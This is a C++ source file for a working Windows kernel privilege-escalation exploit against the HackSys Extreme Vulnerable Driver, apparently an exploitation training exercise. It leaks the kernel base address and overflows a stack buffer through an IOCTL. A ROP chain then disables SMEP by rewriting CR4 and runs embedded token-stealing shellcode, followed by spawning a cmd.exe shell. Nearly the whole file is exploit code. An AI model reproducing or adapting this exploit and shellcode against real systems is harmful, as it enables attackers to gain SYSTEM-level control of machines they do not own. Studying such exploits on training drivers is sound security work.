#include <iostream>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Psapi.h>
#include <vector>
#include <winternl.h>

#pragma comment (lib,"psapi")

using namespace std;

void spawnCmdShell() {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);

    // Use a wide-character string for the command
    LPCWSTR command = L"cmd.exe";

    // Call CreateProcess with the wide-character string
    if (!CreateProcess(
        nullptr,                // Application name
        const_cast<LPWSTR>(command), // Command line
        nullptr,                // Process security attributes
        nullptr,                // Thread security attributes
        FALSE,                  // Inherit handles
        0,                      // Creation flags
        nullptr,                // Environment block
        nullptr,                // Current directory
        &si,                    // STARTUPINFO structure
        &pi                     // PROCESS_INFORMATION structure
    )) {
        std::wcerr << L"Failed to spawn cmd.exe shell. Error: " << GetLastError() << std::endl;
        return;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::wcout << L"Spawned cmd.exe shell successfully!" << std::endl;
}

uintptr_t getKernelBase() {
    const int bufferSize = 8; // Number of drivers we want to query
    std::vector<LPVOID> baseAddresses(bufferSize); // Buffer to store driver addresses
    DWORD bytesNeeded = 0;

    // Call EnumDeviceDrivers to retrieve the addresses of loaded device drivers
    if (!EnumDeviceDrivers(baseAddresses.data(), baseAddresses.size() * sizeof(LPVOID), &bytesNeeded)) {
        std::cerr << "Failed to get kernel base address." << std::endl;
        exit(EXIT_FAILURE);
    }

    // Return the first driver's base address (assumes it's the kernel's base)
    return reinterpret_cast<uintptr_t>(baseAddresses[0]);
}

int main()
{

    uintptr_t kernelBase = getKernelBase();
    std::cout << "Kernel base address: 0x" << std::hex << kernelBase << std::endl;
    getchar();
    HANDLE driver_handle = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (driver_handle == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while opening a handle to the driver: %d\n", GetLastError());
        return 0;
    }
    printf("[+] Successfully obtained the driver handle.\n");

    ULONG ioctl = 0x222003;
  
    ULONG driver_input_buffer_length = 2300;
    char exploit[2300 + 8];
    printf("[*] Preparing our exploit buffer\n");
    // Fill our exploit buffer with 'A'
    memset(exploit, 0x41, 2072);

    ULONGLONG shellcode = kernelBase + 0x3a5d43; // 00000000`003a5d43 + nt = pop rcx ; ret 
    memcpy(exploit + 2072, &shellcode, sizeof(shellcode));

    shellcode = 0x0000000000050ef8; // CR4 disable SMEP
    memcpy(exploit + 2072 + 8, &shellcode, sizeof(shellcode));

    shellcode = kernelBase + 0x513cc9 ; // mov cr4, rcx ; ret 
    memcpy(exploit + 2072 + 8 + 8 , &shellcode, sizeof(shellcode));

    shellcode = 0x00000001a0000000; // Userland 
    memcpy(exploit + 2072 + 8 + 8 + 8, &shellcode, sizeof(shellcode));

    BYTE sc[256] = {
0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };
    
    LPVOID allocation_sc = VirtualAlloc((LPVOID)shellcode, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocation_sc == NULL)
    {
        printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
        exit(1);
    }
    
    RtlCopyMemory(allocation_sc, sc, 256);

    getchar();

    LPDWORD lpBytesReturned = 0;
    if (!DeviceIoControl(driver_handle, ioctl, exploit, driver_input_buffer_length, NULL, NULL, lpBytesReturned, NULL))
    {
        printf("[!] Error while calling DeviceIoControl\n");
    }

    system("cmd");
    return 0;
}